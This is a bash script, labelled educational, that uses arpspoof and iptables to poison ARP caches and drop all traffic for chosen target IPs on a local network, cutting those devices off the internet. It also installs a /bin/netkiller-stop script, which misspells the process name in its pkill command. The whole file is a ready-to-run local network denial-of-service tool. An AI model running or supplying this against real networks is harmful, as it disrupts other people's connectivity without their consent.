#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, and root privileges

echo "Enter Router Gateway IP:"
read -p "> " GATEWAY
echo "Enter Target IP (space-separated for multiple):"
read -p "> " TARGET_IPS
echo "Enter Interface (wlan0):"
read -p "> " INTERFACE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush Iptables existing rules
iptables -F
iptables -X
iptables -t nat -F

# Remove Iptables rules
cat > /bin/netkiller-stop << EOF
iptables -F
iptables -X
iptables -t nat -F
pkill arpsoof
echo "Wifi clients connections are restored"
EOF
chmod 755 /bin/netkiller-stop

for TARGET in $TARGET_IPS; do
   
    # Block all traffic of the target wifi clients
    iptables -I FORWARD -s "$TARGET" -j DROP
    iptables -I FORWARD -d "$TARGET" -j DROP
    iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
   
    # Uncomment to Block all the traffic
    # iptables -I FORWARD -i "$INTERFACE" -j DROP
    # iptables -I FORWARD -o "$INTERFACE" -j DROP
    
    (
        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
    ) &
done

echo "Attacks are running in the background...!!!"
echo "Type: netkiller-stop to restore the wifi clients internet connection..."
